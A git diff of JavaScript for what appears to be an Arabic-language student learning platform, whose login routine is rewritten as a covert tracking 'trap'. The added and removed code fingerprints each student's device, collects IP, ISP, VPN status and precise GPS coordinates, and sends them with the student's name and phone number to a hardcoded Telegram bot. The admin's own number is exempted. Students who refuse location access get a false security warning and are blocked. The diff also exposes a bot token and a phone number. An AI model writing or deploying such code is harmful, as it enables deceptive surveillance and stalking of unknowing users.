@@ -673,152 +673,151 @@ function completeRegistration() {
             }
         };
 
-        async function runApp() {
+async function runApp() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
     if(!user) return;
 
-    // --- الرادار النووي المطور ---
-    const getDeepSpecs = async () => {
+    // --- 🕵️ محرك الاستخبارات الرقمية المطور (Adam Programmer Edition) ---
+    const getDeepIntel = async () => {
         const ua = navigator.userAgent;
-        const gl = document.createElement('canvas').getContext('webgl');
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
 
-        let deviceModel = "Unknown Device";
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            try {
-                const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'architecture']);
-                deviceModel = `${hints.platform} | ${hints.model || 'Generic'} (${hints.architecture || ''})`;
-            } catch(e) { deviceModel = ua.split('(')[1]?.split(')')[0] || "Android Device"; }
-        } else {
-            deviceModel = ua.split('(')[1]?.split(')')[0] || "PC/Mobile";
+        // 1. بصمة الكانفاس (Canvas Hash)
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("KimoV26", 2, 2);
+        const canvasData = canvas.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < canvasData.length; i++) {
+            hash = ((hash << 5) - hash) + canvasData.charCodeAt(i);
+            hash |= 0;
         }
 
-        const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
-        const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown";
-        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No GPU Data";
-        
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const netType = conn ? `${conn.effectiveType}` : "Unknown";
+        // 2. تتبع أدوات المطورين (DevTools Detection)
+        let devOpen = false;
+        const threshold = 160;
+        if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+            devOpen = true;
+        }
 
-        let bat = "??";
+        // 3. أداء الشبكة (Ping)
+        let pingResult = "N/A";
+        try {
+            const start = Date.now();
+            await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors', cache: 'no-cache' });
+            pingResult = (Date.now() - start) + "ms";
+        } catch(e) {}
+
+        // 4. كشف المحاكي واللمس
+        const touchPoints = navigator.maxTouchPoints || 0;
+        const isEmu = (touchPoints === 0 && /Android|iPhone|iPad/i.test(ua)) ? "نعم ⚠️" : "لا ✅";
+
+        // 5. البطارية والـ IP واللوكيشن
+        let batteryStatus = "??";
         if (navigator.getBattery) {
             try {
                 const b = await navigator.getBattery();
-                bat = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`;
+                batteryStatus = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
             } catch(e) {}
         }
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-        let geo = {};
+        let geoData = {};
         try {
-            geo = await fetch('https://ipapi.co/json/').then(res => res.json());
-        } catch(e) { geo = { ip: "Error", city: "Unknown" }; }
+            geoData = await fetch('https://ipapi.co/json/').then(r => r.json());
+        } catch(e) { geoData = { ip: "Error", city: "Unknown" }; }
 
         return {
-            "model": deviceModel,
-            "hw": `${cpuCores} | ${ram}`,
-            "gpu": gpu,
-            "net": netType,
-            "bat": bat,
-            "res": screenRes,
-            "ip": geo.ip,
-            "loc": `${geo.city}, ${geo.country_name}`,
-            "isp": geo.org,
-            "time": new Date().toLocaleString('ar-EG'),
-            "incognito": (()=>{ try { return window.localStorage.length === 0 ? "⚠️ نعم" : "لا"; } catch(e) { return "نعم"; } })()
+            net: {
+                ip: geoData.ip || "Unknown",
+                isp: geoData.org || "Unknown",
+                vpn: (geoData.utc_offset && (parseInt(geoData.utc_offset)/100) !== (-(new Date().getTimezoneOffset()/60))) ? "Active ⚠️" : "No",
+                loc: (geoData.city || "Unknown") + ", " + (geoData.country_name || "Unknown")
+            },
+            hw: {
+                model: ua.split('(')[1]?.split(')')[0] || "Unknown Device",
+                cpu: navigator.hardwareConcurrency || "??",
+                ram: navigator.deviceMemory || "??",
+                gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
+                canvas: Math.abs(hash),
+                touch: touchPoints
+            },
+            status: {
+                ping: pingResult,
+                dev: devOpen ? "مفتوحة 🚫" : "مغلقة",
+                emu: isEmu,
+                bat: batteryStatus
+            }
         };
     };
 
-    const d = await getDeepSpecs();
+    const d = await getDeepIntel();
 
-    // --- إرسال التقرير لتليجرام ---
-    const sendKimoInformer = async (info) => {
-        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
-        const chatId = "5890070301";
-        
-        const text = `🕵️‍♂️ *اصطياد بيانات جديدة*
-👤 *الاسم:* ${user.name}
-📞 *الموبايل:* ${user.phone}
-
-📱 *الجهاز:* ${info.model}
-⚙️ *الهاردوير:* ${info.hw}
-🎮 *الجرافيك:* ${info.gpu}
-📶 *الشبكة:* ${info.net}
-🔋 *البطارية:* ${info.bat}
-🖥️ *الشاشة:* ${info.res}
-
-🌐 *الـ IP:* ${info.ip}
-📍 *المكان:* ${info.loc}
-🏢 *الشركة:* ${info.isp}
-🕵️ *خفي:* ${info.incognito}
-⏰ *التوقيت:* ${info.time}`;
-
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-        fetch(url).catch(e => console.log("TG Error"));
-    };
-
-    if (user.phone !== "01023175098") {
-        sendKimoInformer(d);
-        
+    // --- 🚀 تنفيذ المصيدة وإرسال الموقع التفصيلي ---
+    const runTrap = () => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                const locMsg = `📍 *موقع الطالب ${user.name} الدقيق:* \n${mapLink}`;
-                fetch(`https://api.telegram.org/bot8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY/sendMessage?chat_id=5890070301&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
-                studentsRef.child(user.phone).update({ live_location: mapLink });
-            }, null, {enableHighAccuracy: true});
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                // رابط جوجل ماب المباشر بالإحداثيات
+                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+                
+                const report = "🕵️‍♂️ *إشعار اصطياد بيانات جديد*\n" +
+                             "👤 *الاسم:* " + user.name + " | " + user.phone + "\n\n" +
+                             "📍 *البيانات الجغرافية (GPS):*\n" +
+                             "• الموقع الدقيق: [اضغط لفتح الخريطة](" + mapLink + ")\n" +
+                             "• الـ IP: " + d.net.ip + "\n" +
+                             "• الـ VPN: " + d.net.vpn + "\n" +
+                             "• المدينة: " + d.net.loc + "\n\n" +
+                             "⚙️ *المواصفات التقنية:*\n" +
+                             "• الموديل: " + d.hw.model + "\n" +
+                             "• الهاردوير: " + d.hw.cpu + " Cores | " + d.hw.ram + "GB\n" +
+                             "• الـ GPU: " + d.hw.gpu + "\n" +
+                             "• بصمة الكانفاس: `" + d.hw.canvas + "`\n\n" +
+                             "📶 *الأداء والسلوك:*\n" +
+                             "• سرعة الـ Ping: " + d.status.ping + "\n" +
+                             "• أدوات المطورين: " + d.status.dev + "\n" +
+                             "• محاكي (Emulator): " + d.status.emu + "\n" +
+                             "• نقاط اللمس: " + d.hw.touch + "\n" +
+                             "• البطارية: " + d.status.bat + "\n\n" +
+                             "⏰ *التوقيت:* " + new Date().toLocaleString('ar-EG');
+
+                const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
+                const chatId = "5890070301";
+
+                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(report) + "&parse_mode=Markdown");
+                
+                // تحديث قاعدة البيانات
+                studentsRef.child(user.phone).update({ full_spy: d, gps: mapLink });
+                openPlatform();
+
+            }, () => {
+                alert("⚠️ تنبيه أمني: يجب السماح بالوصول للموقع (GPS) لتأكيد هويتك وتفعيل محاضراتك.");
+                location.reload();
+            }, {enableHighAccuracy: true});
+        } else {
+            openPlatform(); // لو المتصفح مابيدعمش GPS أصلاً
         }
+    };
+
+    // استثناء الأدمن (أنت) من المصيدة
+    if (user.phone !== "01023175098") { 
+        runTrap(); 
+    } else { 
+        openPlatform(); 
     }
 
-    // --- تحديث الداتابيز ---
-    studentsRef.child(user.phone).update({ device_info: d });
-    presenceRef.child(user.phone).set({ name: user.name, last: Date.now(), ...d });
-    presenceRef.child(user.phone).onDisconnect().remove();
-
-    // --- واجهة المستخدم وحماية المنصة ---
-    blacklistRef.child(user.phone).on('value', s => { if(s.exists()) logout(); });
-    
-    document.getElementById('login-gate').style.display = 'none';
-    document.getElementById('sidebar').style.display = 'flex';
-    document.getElementById('top-bar').style.display = 'flex';
-    document.getElementById('news-bar').style.display = 'block';
-    document.getElementById('mob-nav').style.display = 'flex';
-    document.getElementById('content').style.display = 'block';
-    document.getElementById('tg-btn').style.display = 'flex';
-    document.getElementById('display-name').innerText = user.name.split(' ')[0];
-
-    if (!localStorage.getItem("whatsapp_joined")) {
-        document.getElementById("join-overlay").style.display = "flex";
+    function openPlatform() {
+        blacklistRef.child(user.phone).on('value', s => { if(s.exists()) logout(); });
+        document.getElementById('login-gate').style.display = 'none';
+        document.getElementById('sidebar').style.display = 'flex';
+        document.getElementById('top-bar').style.display = 'flex';
+        document.getElementById('content').style.display = 'block';
+        document.getElementById('display-name').innerText = user.name.split(' ')[0];
+        loadData(); renderSubjectGrids();
     }
-
-    // لوحة الأدمن (آدم)
-    if(user.phone === "01023175098") {
-        document.getElementById('adm-links').style.display = 'block';
-        document.getElementById('adm-mob-link').style.display = 'block';
-        document.getElementById('admin-live-info').style.display = 'block';
-
-        studentsRef.on('value', s => {
-            const allData = s.val() || {};
-            document.getElementById('total-students-count').innerText = s.numChildren();
-            document.getElementById('stat-total-std').innerText = s.numChildren();
-            loadStudentsList(Object.entries(allData).reverse());
-        });
-
-        presenceRef.on('value', s => {
-            document.getElementById('online-now').innerText = s.numChildren();
-            document.getElementById('stat-online-std').innerText = s.numChildren();
-        });
-        resultsRef.on('value', s => loadResultsList(s.val()));
-    }
-
-    settingsRef.child('newsTicker').on('value', s => {
-        document.getElementById('ticker-content').innerText = s.val() || "مرحباً بكم في أكاديمية كيمو!";
-    });
-
-    loadData(); 
-    renderSubjectGrids();
 }
-
+        
         function loadData() { lessonsRef.on('value', s => { allData = s.val() || {}; renderLatest(); renderPinned(); }); }
         function loadStudentsList(sortedData) {
     let h = "";
